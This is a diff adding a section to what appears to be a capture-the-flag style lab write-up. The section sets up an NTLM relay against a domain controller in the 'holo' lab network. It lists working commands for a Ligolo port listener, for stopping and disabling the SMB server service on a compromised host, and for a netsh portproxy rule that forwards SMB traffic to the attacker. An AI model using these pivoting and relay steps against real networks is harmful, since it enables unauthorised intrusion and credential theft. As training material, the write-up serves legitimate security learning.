@@ -1711,7 +1711,27 @@ Verify if we can get a cmd as administrator:
     Enter the password for support.it:
     Attempting to start cmd.exe as user "PC-FILESRV01\support.it" ...
 
-A new administrator cmd window should appear.
+A new administrator cmd window should appear. The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to forward the traffic to us. The others requiremnts are satisfied since:
+- We have compromised with administrator privileges: PC-FILESRV01
+- THe target host has not SMB strict sign enabled: DC-SRV01
+
+The other server (S-SRV02) inside the network cannot be use as target since SMB is not enabled. As said before, since we need to forward the SMB traffic from the compromoside host (PC-FILESRV01) to our attacker machine. To accomplish the task first I set another listener to the Ligolo agent on 10.200.95.33
+
+    listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+
+Now we need to perform an invasive action, since we are going to stop lanmanserver service and reboot the system in order to free port 445
+
+    sc stop lanmanserver
+    sc config lanmanserver start=disabled
+
+Then reboot. Once the machine comes up again we can verify that SMB is off:
+
+    netstat -an | findstr :445
+
+The command must return nothing. At this point I set a portforwarding rule in PC-FILESRV01 to forward incoming SMB traffic to the agent:
+
+    netsh interface portproxy add v4tov4 listenport=445 listenaddress=10.200.95.35 connectport=445 connectaddress=10.200.95.33
+
 
     
 
